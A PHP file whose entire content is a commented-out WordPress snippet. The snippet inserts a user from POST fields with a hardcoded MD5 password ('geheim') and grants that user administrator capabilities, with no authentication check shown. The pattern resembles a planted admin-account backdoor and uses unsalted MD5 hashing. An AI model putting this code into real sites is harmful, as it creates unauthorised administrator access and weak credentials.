<?php
   /*
         $wpdb->query(
               $wpdb->prepare("INSERT INTO `wp_users` (`ID`,
                                          `user_login`,
                                          `user_pass`,
                                          `user_nicename`,
                                          `user_email`,
                                          `user_registered`,
                                          `user_status`,
                                          `display_name`)
                              VALUES       (NULL,
                                          %s,
                                          %s,
                                          %s,
                                          %s,
                                          %s,
                                          %d,
                                          %s)",
                                          $_POST["loginname"],
                                          MD5("geheim"),
                                          $_POST["loginname"],
                                          $_POST["email"],
                                          date("Y-m-d H:i:s"),
                                          0,
                                          $_POST["loginname"])
         );

         $id = $wpdb->insert_id;

         $wpdb->query(
            $wpdb->prepare("INSERT INTO `wp_usermeta` (`umeta_id`,
                                                       `user_id`,
                                                       `meta_key`,
                                                       `meta_value`)
                            VALUES                    (NULL,
                                                       %d,
                                                       %s,
                                                       %s)",
                                                       $id,
                                                       'first_name',
                                                       $_POST["firstname"])
         );

         $wpdb->query(
            $wpdb->prepare("INSERT INTO `wp_usermeta` (`umeta_id`,
                                                       `user_id`,
                                                       `meta_key`,
                                                       `meta_value`)
                            VALUES                    (NULL,
                                                       %d,
                                                       %s,
                                                       %s)",
                                                       $id,
                                                       'last_name',
                                                       $_POST["lastname"])
         );

        

      $wpdb->query(
            $wpdb->prepare("INSERT INTO `wp_usermeta` (`umeta_id`,
                                                       `user_id`,
                                                       `meta_key`,
                                                       `meta_value`)
                            VALUES                    (NULL,
                                                       %d,
                                                       %s,
                                                       %s)",
                                                       $id,
                                                       'wp_capabilities',
                                                       serialize(array("administrator" => true)))
         );
         */
?>